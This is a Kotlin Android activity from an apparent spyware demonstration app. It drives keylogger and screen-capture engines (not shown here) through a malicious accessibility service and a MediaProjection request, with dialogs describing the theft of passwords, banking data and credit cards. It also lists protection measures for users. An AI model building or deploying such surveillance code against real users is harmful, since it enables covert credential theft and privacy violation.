package com.securitydemo.malware.activities

import android.app.AlertDialog
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.securitydemo.malware.R
import com.securitydemo.malware.services.MaliciousAccessibilityService
import com.securitydemo.malware.utils.KeyloggerEngine
import com.securitydemo.malware.utils.ScreenCaptureEngine
import kotlinx.coroutines.*
import java.io.File

/**
 * SECURITY DEMO: Keylogger and Screen Capture Activity
 * 
 * This activity demonstrates the most invasive malware capabilities:
 * - Complete keystroke logging and password capture
 * - Continuous screen recording and screenshot capture
 * - Real-time monitoring of all user interactions
 * - Credential harvesting from login forms
 * - Sensitive content detection and extraction
 * 
 * EDUCATIONAL PURPOSE ONLY - Shows comprehensive surveillance techniques
 */
class KeyloggerActivity : AppCompatActivity() {

    private lateinit var statusTextView: TextView
    private lateinit var startKeyloggerButton: Button
    private lateinit var startScreenCaptureButton: Button
    private lateinit var viewCapturedDataButton: Button
    private lateinit var analysisButton: Button

    private lateinit var keyloggerEngine: KeyloggerEngine
    private lateinit var screenCaptureEngine: ScreenCaptureEngine
    
    private val activityScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private var isKeyloggerActive = false
    private var isScreenCaptureActive = false

    companion object {
        private const val SCREEN_CAPTURE_REQUEST_CODE = 3001
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_keylogger)

        initializeViews()
        initializeEngines()
        
        showSurveillanceWarning()
        checkSurveillancePermissions()
    }

    private fun initializeViews() {
        statusTextView = findViewById(R.id.tv_keylogger_status)
        startKeyloggerButton = findViewById(R.id.btn_start_keylogger)
        startScreenCaptureButton = findViewById(R.id.btn_start_screen_capture)
        viewCapturedDataButton = findViewById(R.id.btn_view_captured_data)
        analysisButton = findViewById(R.id.btn_surveillance_analysis)

        startKeyloggerButton.setOnClickListener { toggleKeylogger() }
        startScreenCaptureButton.setOnClickListener { toggleScreenCapture() }
        viewCapturedDataButton.setOnClickListener { showCapturedData() }
        analysisButton.setOnClickListener { showSurveillanceAnalysis() }
    }

    private fun initializeEngines() {
        keyloggerEngine = KeyloggerEngine(this)
        screenCaptureEngine = ScreenCaptureEngine(this)
    }

    private fun showSurveillanceWarning() {
        AlertDialog.Builder(this)
            .setTitle("‚ö†Ô∏è Advanced Surveillance Demo")
            .setMessage("""
                This demonstrates the most invasive malware capabilities:
                
                üîç KEYLOGGING CAPABILITIES:
                ‚Ä¢ Capture ALL keyboard input
                ‚Ä¢ Steal passwords and PINs
                ‚Ä¢ Record private messages
                ‚Ä¢ Monitor search queries
                ‚Ä¢ Extract credit card numbers
                
                üì∏ SCREEN SURVEILLANCE:
                ‚Ä¢ Continuous screenshot capture
                ‚Ä¢ Screen recording functionality
                ‚Ä¢ Sensitive content detection
                ‚Ä¢ Visual credential harvesting
                ‚Ä¢ Real-time visual monitoring
                
                üéØ ATTACK OBJECTIVES:
                ‚Ä¢ Complete user surveillance
                ‚Ä¢ Credential theft and fraud
                ‚Ä¢ Privacy violation
                ‚Ä¢ Blackmail material collection
                
                ‚ö†Ô∏è This is for educational purposes only!
            """.trimIndent())
            .setPositiveButton("Understood", null)
            .show()
    }

    private fun checkSurveillancePermissions() {
        updateStatus("üîç SURVEILLANCE SYSTEM ANALYSIS\n\n")
        
        val requirements = StringBuilder()
        requirements.append("=== SURVEILLANCE REQUIREMENTS ===\n\n")

        // Check accessibility service
        val accessibilityEnabled = isAccessibilityServiceEnabled()
        requirements.append("ü§ñ Accessibility Service: ${if (accessibilityEnabled) "‚úì ACTIVE" else "‚úó REQUIRED"}\n")

        // Check screen capture permission
        val canCaptureScreen = canCaptureScreen()
        requirements.append("üì± Screen Capture: ${if (canCaptureScreen) "‚úì AVAILABLE" else "‚úó REQUIRED"}\n")

        // Check overlay permission
        val canDrawOverlays = Settings.canDrawOverlays(this)
        requirements.append("üîÑ System Overlay: ${if (canDrawOverlays) "‚úì GRANTED" else "‚úó REQUIRED"}\n\n")

        if (accessibilityEnabled) {
            requirements.append("üö® CRITICAL: Full surveillance capabilities active!\n")
            requirements.append("‚Ä¢ Every keystroke can be captured\n")
            requirements.append("‚Ä¢ All screen content can be monitored\n")
            requirements.append("‚Ä¢ Complete user activity surveillance\n\n")
            
            startKeyloggerButton.isEnabled = true
            startScreenCaptureButton.isEnabled = true
        } else {
            requirements.append("‚ÑπÔ∏è Enable accessibility service for full surveillance\n\n")
        }

        // Show protection measures
        requirements.append("üõ°Ô∏è PROTECTION MEASURES:\n")
        requirements.append("‚Ä¢ Never enable accessibility for unknown apps\n")
        requirements.append("‚Ä¢ Regularly audit enabled accessibility services\n")
        requirements.append("‚Ä¢ Monitor for suspicious screen recording apps\n")
        requirements.append("‚Ä¢ Use secure keyboards for passwords\n")
        requirements.append("‚Ä¢ Check for overlay attacks on login screens\n")

        updateStatus(requirements.toString())

        if (!accessibilityEnabled) {
            showAccessibilityDialog()
        }
    }

    private fun showAccessibilityDialog() {
        AlertDialog.Builder(this)
            .setTitle("Surveillance Permission Required")
            .setMessage("To demonstrate keylogging and screen capture, this app needs accessibility permissions. This is exactly what spyware requests to monitor everything you do.")
            .setPositiveButton("Enable Service") { _, _ ->
                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivity(intent)
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun toggleKeylogger() {
        if (!isAccessibilityServiceEnabled()) {
            Toast.makeText(this, "Accessibility service required for keylogging", Toast.LENGTH_LONG).show()
            return
        }

        if (isKeyloggerActive) {
            stopKeylogger()
        } else {
            startKeylogger()
        }
    }

    private fun startKeylogger() {
        updateStatus("üöÄ STARTING KEYLOGGER ATTACK...\n\n")
        
        activityScope.launch {
            try {
                updateStatus("Phase 1: Initializing keystroke capture engine...")
                delay(1000)

                val result = keyloggerEngine.startKeylogging()
                
                if (result) {
                    isKeyloggerActive = true
                    startKeyloggerButton.text = "Stop Keylogger"
                    
                    updateStatus("‚úÖ KEYLOGGER ACTIVE!")
                    updateStatus("üîç Monitoring ALL keyboard input...")
                    updateStatus("üéØ Target applications: Banking, Messaging, Email")
                    updateStatus("üíÄ Passwords, PINs, messages being captured")
                    updateStatus("\nüö® COMPLETE KEYSTROKE SURVEILLANCE ACTIVE!")
                    
                    showKeyloggerSuccess()
                    
                    // Start monitoring captured data
                    startDataMonitoring()
                    
                } else {
                    updateStatus("‚ùå Keylogger activation failed")
                }

            } catch (e: Exception) {
                updateStatus("üí• Keylogger error: ${e.message}")
            }
        }
    }

    private fun stopKeylogger() {
        keyloggerEngine.stopKeylogging()
        isKeyloggerActive = false
        startKeyloggerButton.text = "Start Keylogger"
        updateStatus("‚èπÔ∏è Keylogger stopped\n")
    }

    private fun toggleScreenCapture() {
        if (isScreenCaptureActive) {
            stopScreenCapture()
        } else {
            requestScreenCapturePermission()
        }
    }

    private fun requestScreenCapturePermission() {
        val mediaProjectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val intent = mediaProjectionManager.createScreenCaptureIntent()
        startActivityForResult(intent, SCREEN_CAPTURE_REQUEST_CODE)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        if (requestCode == SCREEN_CAPTURE_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                startScreenCapture(data)
            } else {
                updateStatus("‚ùå Screen capture permission denied\n")
            }
        }
    }

    private fun startScreenCapture(permissionData: Intent) {
        updateStatus("üì∏ STARTING SCREEN SURVEILLANCE...\n\n")
        
        activityScope.launch {
            try {
                updateStatus("Phase 1: Establishing screen capture service...")
                delay(1000)

                val result = screenCaptureEngine.startScreenCapture(permissionData)
                
                if (result) {
                    isScreenCaptureActive = true
                    startScreenCaptureButton.text = "Stop Screen Capture"
                    
                    updateStatus("‚úÖ SCREEN SURVEILLANCE ACTIVE!")
                    updateStatus("üì± Capturing screenshots every 5 seconds...")
                    updateStatus("üéØ Monitoring: Login screens, Banking apps, Messages")
                    updateStatus("üíÄ Sensitive visual content being harvested")
                    updateStatus("\nüö® COMPLETE VISUAL SURVEILLANCE ACTIVE!")
                    
                    showScreenCaptureSuccess()
                    
                } else {
                    updateStatus("‚ùå Screen capture activation failed")
                }

            } catch (e: Exception) {
                updateStatus("üí• Screen capture error: ${e.message}")
            }
        }
    }

    private fun stopScreenCapture() {
        screenCaptureEngine.stopScreenCapture()
        isScreenCaptureActive = false
        startScreenCaptureButton.text = "Start Screen Capture"
        updateStatus("‚èπÔ∏è Screen capture stopped\n")
    }

    private fun startDataMonitoring() {
        activityScope.launch {
            while (isKeyloggerActive || isScreenCaptureActive) {
                try {
                    delay(10000) // Check every 10 seconds
                    
                    val keystrokeCount = keyloggerEngine.getKeystrokeCount()
                    val screenshotCount = screenCaptureEngine.getScreenshotCount()
                    val credentialsFound = keyloggerEngine.getCredentialsFound()
                    
                    updateStatus("üìä LIVE SURVEILLANCE STATUS:")
                    updateStatus("‚Ä¢ Keystrokes captured: $keystrokeCount")
                    updateStatus("‚Ä¢ Screenshots taken: $screenshotCount") 
                    updateStatus("‚Ä¢ Credentials harvested: $credentialsFound")
                    updateStatus("‚Ä¢ Privacy violations: CONTINUOUS\n")
                    
                } catch (e: Exception) {
                    // Silently continue monitoring
                }
            }
        }
    }

    private fun showCapturedData() {
        activityScope.launch {
            val report = generateCaptureReport()
            
            AlertDialog.Builder(this@KeyloggerActivity)
                .setTitle("üìä Captured Surveillance Data")
                .setMessage(report)
                .setPositiveButton("Close", null)
                .show()
        }
    }

    private fun showSurveillanceAnalysis() {
        activityScope.launch {
            val analysis = generateSurveillanceAnalysis()
            
            AlertDialog.Builder(this@KeyloggerActivity)
                .setTitle("üîç Surveillance Analysis Report")
                .setMessage(analysis)
                .setPositiveButton("Close", null)
                .show()
        }
    }

    private fun generateCaptureReport(): String {
        val report = StringBuilder()
        report.append("=== CAPTURED SURVEILLANCE DATA ===\n\n")
        
        try {
            // Keylogger data
            val keylogData = keyloggerEngine.generateReport()
            report.append("üîç KEYLOGGER REPORT:\n")
            report.append(keylogData)
            report.append("\n\n")
            
            // Screen capture data
            val screenData = screenCaptureEngine.generateReport()
            report.append("üì∏ SCREEN CAPTURE REPORT:\n")
            report.append(screenData)
            report.append("\n\n")
            
            // Combined analysis
            report.append("üéØ COMBINED SURVEILLANCE IMPACT:\n")
            report.append("‚Ä¢ Complete user behavior profiling\n")
            report.append("‚Ä¢ Comprehensive credential harvesting\n")
            report.append("‚Ä¢ Visual and textual privacy violation\n")
            report.append("‚Ä¢ Real-time activity monitoring\n")
            report.append("‚Ä¢ Identity theft material collection\n")
            
        } catch (e: Exception) {
            report.append("Error generating report: ${e.message}")
        }
        
        return report.toString()
    }

    private fun generateSurveillanceAnalysis(): String {
        return try {
            val analysis = StringBuilder()
            analysis.append("=== SURVEILLANCE SYSTEM ANALYSIS ===\n\n")
            
            analysis.append("üìä SURVEILLANCE CAPABILITIES:\n")
            analysis.append("‚Ä¢ Keylogger: ${if (isKeyloggerActive) "ACTIVE" else "INACTIVE"}\n")
            analysis.append("‚Ä¢ Screen capture: ${if (isScreenCaptureActive) "ACTIVE" else "INACTIVE"}\n")
            analysis.append("‚Ä¢ Real-time monitoring: ${if (isKeyloggerActive || isScreenCaptureActive) "ENABLED" else "DISABLED"}\n\n")
            
            analysis.append("üéØ ATTACK EFFECTIVENESS:\n")
            when {
                isKeyloggerActive && isScreenCaptureActive -> {
                    analysis.append("üö® MAXIMUM SURVEILLANCE: Complete user monitoring\n")
                    analysis.append("‚Ä¢ Every action captured and recorded\n")
                    analysis.append("‚Ä¢ Visual and textual content harvested\n")
                    analysis.append("‚Ä¢ Complete privacy violation achieved\n")
                }
                isKeyloggerActive -> {
                    analysis.append("‚ö†Ô∏è HIGH SURVEILLANCE: Text input monitoring\n")
                    analysis.append("‚Ä¢ All typing captured including passwords\n")
                    analysis.append("‚Ä¢ Credential theft in progress\n")
                }
                isScreenCaptureActive -> {
                    analysis.append("‚ö†Ô∏è MEDIUM SURVEILLANCE: Visual monitoring\n")
                    analysis.append("‚Ä¢ Screen content being captured\n")
                    analysis.append("‚Ä¢ Visual credential harvesting active\n")
                }
                else -> {
                    analysis.append("‚úì NO SURVEILLANCE: System protected\n")
                }
            }
            
            analysis.append("\nüí∞ ESTIMATED ATTACK VALUE:\n")
            val capturedData = keyloggerEngine.getKeystrokeCount() + screenCaptureEngine.getScreenshotCount()
            analysis.append("‚Ä¢ Data points captured: $capturedData\n")
            analysis.append("‚Ä¢ Estimated dark web value: $${capturedData * 0.25}\n")
            analysis.append("‚Ä¢ Identity theft risk: ${if (capturedData > 100) "CRITICAL" else if (capturedData > 50) "HIGH" else "MEDIUM"}\n")
            
            analysis.toString()
            
        } catch (e: Exception) {
            "Error generating analysis: ${e.message}"
        }
    }

    private fun showKeyloggerSuccess() {
        AlertDialog.Builder(this)
            .setTitle("üéØ KEYLOGGER ACTIVATED")
            .setMessage("""
                Keystroke surveillance is now active!
                
                CAPTURING:
                ‚Ä¢ Every character typed
                ‚Ä¢ All passwords and PINs
                ‚Ä¢ Private messages and emails
                ‚Ä¢ Search queries and URLs
                ‚Ä¢ Credit card numbers
                ‚Ä¢ Security questions and answers
                
                The user has no indication that
                everything they type is being
                recorded and transmitted.
            """.trimIndent())
            .setPositiveButton("Understood", null)
            .show()
    }

    private fun showScreenCaptureSuccess() {
        AlertDialog.Builder(this)
            .setTitle("üì∏ SCREEN SURVEILLANCE ACTIVE")
            .setMessage("""
                Visual monitoring is now operational!
                
                CAPTURING:
                ‚Ä¢ Continuous screenshots
                ‚Ä¢ Login screen credentials
                ‚Ä¢ Banking application content
                ‚Ä¢ Private conversation screenshots
                ‚Ä¢ Document and photo viewing
                ‚Ä¢ Sensitive visual information
                
                Every screen the user views is being
                recorded and can be analyzed for
                sensitive information.
            """.trimIndent())
            .setPositiveButton("Understood", null)
            .show()
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        return enabledServices?.contains("${packageName}/${MaliciousAccessibilityService::class.java.name}") == true
    }

    private fun canCaptureScreen(): Boolean {
        // In a real implementation, this would check for media projection permissions
        return true
    }

    private fun updateStatus(message: String) {
        statusTextView.text = "${statusTextView.text}$message\n"
        statusTextView.post {
            val parent = statusTextView.parent as android.widget.ScrollView
            parent.fullScroll(android.widget.ScrollView.FOCUS_DOWN)
        }
    }

    override fun onResume() {
        super.onResume()
        // Update status when returning to activity
        activityScope.launch {
            delay(500)
            checkSurveillancePermissions()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        activityScope.cancel()
        
        // Stop surveillance if active
        if (isKeyloggerActive) {
            stopKeylogger()
        }
        if (isScreenCaptureActive) {
            stopScreenCapture()
        }
    }
}
